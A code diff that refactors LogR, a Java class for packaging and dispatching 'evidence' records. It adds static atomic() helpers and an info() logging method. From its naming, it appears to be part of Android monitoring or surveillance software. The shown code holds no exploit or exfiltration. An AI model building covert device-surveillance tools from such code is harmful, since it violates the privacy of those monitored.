@@ -7,18 +7,23 @@
  * Author		: zeno
  * *******************************************/
 
-package com.android.networking;
+package com.android.networking.evidence;
 
 import java.util.ArrayList;
 
+import com.android.networking.Packet;
+import com.android.networking.auto.Cfg;
+import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.Utils;
+import com.android.networking.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class LogR.
  */
 public class LogR {
+	private static final String TAG = "LogR"; 
 
 	/** The type. */
 	private int type;
@@ -45,27 +50,12 @@ public class LogR {
 
 	/** The Constant LOG_CLOSE. */
 	final public static int LOG_CLOSE = 0x5;
-
-	/** The Constant LOG_PRI_MAX. */
-	final public static int LOG_PRI_MAX = 0x1;
-
-	/** The Constant LOG_PRI_STD. */
-	final public static int LOG_PRI_STD = 0x7f;
-
-	/** The Constant LOG_PRI_MIN. */
-	final public static int LOG_PRI_MIN = 0xff;
-
-	private Packet init(final int evidence, final int priority) {
-		unique = Utils.getRandom();
-		disp = EvDispatcher.self();
-		type = evidence;
-
-		final Packet p = new Packet(unique);
-
-		p.setType(type);
-		p.setPriority(priority);
-		return p;
-	}
+	
+	/** The Constant LOG_ITEMS. */
+	final public static int LOG_ITEMS = 0x6;
+	
+	/** The EVIDENCE delimiter. */
+	public static int E_DELIMITER = 0xABADC0DE;
 
 	/**
 	 * Instantiates a new log, creates the evidence.
@@ -75,8 +65,8 @@ public class LogR {
 	 * @param priority
 	 *            the priority
 	 */
-	public LogR(final int evidence, final int priority) {
-		final Packet p = init(evidence, priority);
+	public LogR(final int evidence) {
+		final Packet p = init(evidence);
 		p.setCommand(LOG_CREATE);
 
 		send(p);
@@ -92,8 +82,8 @@ public class LogR {
 	 * @param additional
 	 *            the additional
 	 */
-	public LogR(final int evidenceType, final int priority, final byte[] additional) {
-		final Packet p = init(evidenceType, priority);
+	public LogR(final int evidenceType, final byte[] additional) {
+		final Packet p = init(evidenceType);
 		p.setCommand(LOG_CREATE);
 		p.setAdditional(additional);
 
@@ -113,8 +103,8 @@ public class LogR {
 	 * @param data
 	 *            the data
 	 */
-	public LogR(final int evidenceType, final int priority, final byte[] additional, final byte[] data) {
-		final Packet p = init(evidenceType, priority);
+	private LogR(final int evidenceType, final byte[] additional, final byte[] data) {
+		final Packet p = init(evidenceType);
 		p.setCommand(LOG_ATOMIC);
 		p.setAdditional(additional);
 		p.fill(data);
@@ -124,12 +114,35 @@ public class LogR {
 		send(p);
 	}
 
-	public LogR(final int evidenceType, final byte[] additional, final byte[] data) {
-		this(evidenceType, LOG_PRI_STD, additional, data);
+	private Packet init(final int evidence) {
+		unique = Utils.getRandom();
+		disp = EvDispatcher.self();
+		type = evidence;
+	
+		final Packet p = new Packet(unique);
+	
+		p.setType(type);
+	
+		return p;
 	}
 
-	public LogR(int evidenceType) {
-		this(evidenceType, LOG_PRI_STD);
+	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
+		/*final Packet p = new Packet(Utils.getRandom());
+		p.setType(evidenceType);
+
+		p.setCommand(LOG_ATOMIC);
+		p.setAdditional(additional);
+		p.fill(data);*/
+		
+		final Packet p = new Packet(evidenceType,additional,data);
+		
+		EvDispatcher.self().send(p);
+	}
+
+	public static void atomic(int evidenceType, ArrayList<byte[]> items) {
+		final Packet p = new Packet(evidenceType,items);
+
+		EvDispatcher.self().send(p);
 	}
 
 	// Send data to dispatcher
@@ -199,5 +212,31 @@ public class LogR {
 
 	public boolean hasData() {
 		return hasData;
+	}
+
+	/**
+	 * Info.
+	 * 
+	 * @param message
+	 *            the message
+	 */
+	public static void info(final String message) {
+		try {
+			// atomic info
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + message);//$NON-NLS-1$
+			}
+
+			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));
+
+		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
+			}
+		}
 	}
 }
